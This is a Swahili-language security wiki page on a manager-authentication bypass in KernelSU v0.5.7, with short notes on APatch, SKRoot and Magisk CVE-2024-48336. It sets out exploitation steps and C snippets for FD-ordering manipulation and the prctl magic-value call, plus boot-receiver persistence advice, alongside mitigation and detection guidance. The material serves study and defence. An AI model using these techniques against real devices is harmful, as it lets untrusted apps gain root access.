# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks kama KernelSU, APatch na SKRoot hu-patch au hu-hook kernel ya Android/Linux na kufichua utendaji wenye privileges kwa manager app ya userspace isiyo na privileges. Magisk inajadiliwa kando hapa chini kwa sababu CVE-2024-48336 ilihusisha upakiaji wa code upande wa manager, badala ya njia hii ya KernelSU syscall.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Ukurasa huu unatoa muhtasari wa techniques na pitfalls zilizogunduliwa katika research ya umma (hasa analysis ya Zimperium kuhusu KernelSU v0.5.7) ili kusaidia red na blue teams kuelewa attack surfaces, exploitation primitives, na mitigations thabiti.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- Katika KernelSU v0.5.7, kernel hook kwenye `prctl` hupokea magic value, command ID na arguments maalum za command kutoka userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Caller kwanza huomba manager status kwa `CMD_BECOME_MANAGER`. Authorization ni maalum kwa kila command: `CMD_GRANT_ROOT` hukagua hali ya manager/allowlist, `CMD_ALLOW_SU` inaruhusiwa kwa manager pekee, na `CMD_SET_SEPOLICY` inaruhusiwa kwa root pekee katika version hii.<sup>[[2]](#references)[[11]](#references)</sup>
- Commands nyingine huuliza version/configuration au kuripoti framework events.<sup>[[2]](#references)</sup>
- Kwa sababu app yoyote inaweza ku-invoke syscall interface hii, usahihi wa manager authentication ni muhimu sana.<sup>[[1]](#references)[[2]](#references)</sup>

Mfano (muundo wa KernelSU):
- Hooked syscall: prctl
- Magic value ya ku-redirect kwenda KernelSU handler: 0xDEADBEEF
- Commands zinajumuisha: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (kama ilivyotekelezwa)

Userspace inapoiita prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU huthibitisha:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- Path iliyotolewa lazima ianze na prefix inayotarajiwa kwa caller UID, kwa mfano /data/data/<pkg> au /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- Path lazima iwe inamilikiwa na caller UID.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check via FD table scan
- Iterate kwenye file descriptors zilizo wazi za calling process kwa mpangilio wa descriptor unaoongezeka.
- Kwa kila regular file ambayo path yake inaanza na `/data/app/` na kuishia na `/base.apk`, path lazima iwe na package substring inayotokana na data-directory path iliyotolewa.
- Huthibitisha signature ya candidate wa kwanza anayepita path checks hizo.
- Huchanganua APK v2 signature na kuthibitisha dhidi ya official manager certificate.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Checks zote zikifaulu, kernel huhifadhi UID ya manager kwa muda; manager-only commands hukubali UID hiyo, huku commands nyingine zikiendelea kutumia UID zao au allowlist checks.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7 haihusishi signature result na installed package identity ya PackageManager. Katika `manager.c`, package test ni path substring check pekee (`strstr(cwd, pkg)`); candidate wa kwanza anayepita check hiyo ndiye anayefanyiwa signature-check. Kwa hiyo attacker anaweza kuweka genuine manager APK chini ya path ya `/data/app/` ambayo pia ina package name ya attacker, na kupanga ichaguliwe kwanza.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Trust-by-indirection hii huruhusu app isiyo na privileges ku-impersonate manager bila kumiliki signing key ya manager.<sup>[[1]](#references)</sup>

Sifa muhimu zilizotumiwa:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scan hupangwa kwa descriptor index na package check ni path substring test, si verified package-to-APK identity binding.
- open() hurudisha FD yenye nambari ndogo zaidi inayopatikana. Kwa kufunga FDs zenye nambari ndogo kwanza, attacker anaweza kudhibiti ordering.
- Manager APK iliyobundled inaweza kuwekwa chini ya `/data/app/` kwenye path iliyo na package string ya attacker huku ikihifadhi official manager signature.

---
## Attack preconditions

Kesi halisi ya KernelSU v0.5.7 inahitaji:<sup>[[1]](#references)[[3]](#references)</sup>

- Device iwe tayari ime-rootiwa kwa rooting framework yenye vulnerability (kwa mfano, KernelSU v0.5.7).
- Attacker aweze kuendesha arbitrary unprivileged code locally (Android app process).
- Kwa implementation ya v0.5.7, `current->real_parent` lazima iwe na UID 0 (source comment inaeleza hili kama zygote direct-child requirement); `manager.c` hukataa parents wengine.<sup>[[3]](#references)</sup>
- Real manager iwe bado haija-authenticate (kwa mfano, mara tu baada ya reboot). Baadhi ya frameworks huhifadhi manager UID baada ya success; lazima ushinde race.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

Hatua za kiwango cha juu (video ya demo iliyonukuliwa inaonyesha public proof of concept ikifanya kazi):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Tengeneza path halali kuelekea data directory ya app yako ili kutimiza prefix na ownership checks.
2) Weka genuine KernelSU Manager base.apk chini ya `/data/app/` kwenye path iliyo na package string yako, kisha ifungue kwenye FD yenye nambari ndogo kuliko FD ya base.apk yako.
3) Invoke prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) ili kupita checks.
4) Tumia `CMD_GRANT_ROOT`, kisha `CMD_ALLOW_SU` kwa su ya kudumu; invoke `CMD_SET_SEPOLICY` ya root-only baada tu ya kupata root na pale tu inapoungwa mkono.

Maelezo ya vitendo kuhusu hatua ya 2 (FD ordering):<sup>[[1]](#references)</sup>
- Tambua FD ya process yako kwa /data/app/*/base.apk yako kwa kutembea kwenye symlinks za /proc/self/fd.
- Funga FD yenye nambari ndogo (kwa mfano, stdin, fd 0) na ufungue legitimate manager APK kwanza ili ichukue fd 0 (au index yoyote iliyo ndogo kuliko base.apk fd yako).
- Bundle legitimate manager APK pamoja na app yako ili path yake ianze na `/data/app/`, iishie na `/base.apk`, na iwe na package string yako. Kwa mfano, path iliyo chini ya `lib` directory ya app yako inaweza kutimiza checks hizi.<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Lazimisha FD yenye nambari ya chini kuelekeza kwenye APK halali ya manager:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Uthibitishaji wa Manager kupitia `prctl` hook ya KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Baada ya kufanikiwa, commands zenye privileged access (mifano):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: pandisha process ya sasa iwe root
- CMD_ALLOW_SU: ongeza package/UID yako kwenye allowlist kwa su endelevu
- CMD_SET_SEPOLICY: rekebisha policy ya SELinux baada ya kupata root; KernelSU v0.5.7 hukagua UID 0 kwa command hii.<sup>[[2]](#references)</sup>

Ushauri wa race/persistence:
- Sajili receiver ya BOOT_COMPLETED katika AndroidManifest (`RECEIVE_BOOT_COMPLETED`) ili kuanza baada ya reboot na kujaribu authentication kabla ya manager halisi; permission hii inaidhinisha kupokea `ACTION_BOOT_COMPLETED` lakini yenyewe haihakikishi kipaumbele cha scheduling.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Mwongozo wa detection na mitigation

Kwa developers wa framework:
- Funga authentication kwenye package/UID ya caller, si kwenye FDs za kiholela:
- Tambua package ya caller kutoka kwenye UID yake na uithibitishe dhidi ya signature ya package iliyosakinishwa (kupitia PackageManager) badala ya kuscan FDs.
- Ikiwa ni kernel-only, tumia identity thabiti ya caller (task creds) na uithibitishe dhidi ya chanzo thabiti cha ukweli kinachosimamiwa na init/helper wa userspace, si process FDs.
- Epuka ukaguzi wa path-prefix kama identity; caller anaweza kuitimiza kwa urahisi.
- Tumia challenge–response inayotegemea nonce kupitia channel na ufute identity yoyote ya manager iliyohifadhiwa kwenye cache wakati wa boot au kwenye key events.
- Zingatia IPC yenye authentication inayotegemea binder badala ya kutumia vibaya generic syscalls inapowezekana.

Kwa defenders/blue team:
- Tambua uwepo wa rooting frameworks na processes za manager; monitor calls za prctl zenye magic constants zinazotiliwa shaka (kwa mfano, 0xDEADBEEF) ikiwa una kernel telemetry.<sup>[[1]](#references)[[11]](#references)</sup>
- Kwenye fleets zinazosimamiwa, zuia au toa alert kuhusu boot receivers kutoka kwa packages zisizoaminika zinazojaribu kwa kasi commands zenye privileged manager access baada ya boot.
- Hakikisha devices zimesasishwa hadi matoleo ya framework yaliyopatchiwa; invalidisha manager IDs zilizohifadhiwa kwenye cache wakati wa update.

Vikwazo vya attack:<sup>[[1]](#references)[[2]](#references)</sup>
- Huathiri tu devices ambazo tayari zimefanywa root kwa framework iliyo vulnerable.
- Kwa kawaida huhitaji reboot/race window kabla ya manager halali kufanya authentication (baadhi ya frameworks huhifadhi UID ya manager hadi reset).

---
## Maelezo yanayohusiana katika frameworks mbalimbali

- Authentication inayotegemea password (kwa mfano, builds za zamani za APatch/SKRoot) inaweza kuwa dhaifu ikiwa passwords zinaweza kukisiwa/kufanyiwa bruteforce au validations zina bugs.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Authentication inayotegemea package/signature (kwa mfano, KernelSU) ni imara zaidi kimsingi, lakini lazima ifungwe kwenye caller halisi, si artefacts zinazotokana na path na kuchaguliwa kupitia scans za FD.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 iliathiri builds za kabla ya Canary 27007 zilizopakia code kutoka kwenye GMS package isiyothibitishwa, na kuruhusu local app kutekeleza code ndani ya Magisk app na kupandisha privileges hadi root bila user interaction.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Rooting ya Uovu Wote: Mapengo ya Usalama Ambayo Yangeweza Kuhatarisha Mobile Device Yako](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – ukaguzi wa authentication wa core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – iteration ya FD ya manager.c, ukaguzi wa package na mwito wa signature](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – uthibitishaji wa APK v2 katika apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Mradi wa KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Hoja ya Magisk #8279 – Thibitisha kuwa GMS ni system app](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Video ya demo ya KSU PoC (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – identifiers za command za ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
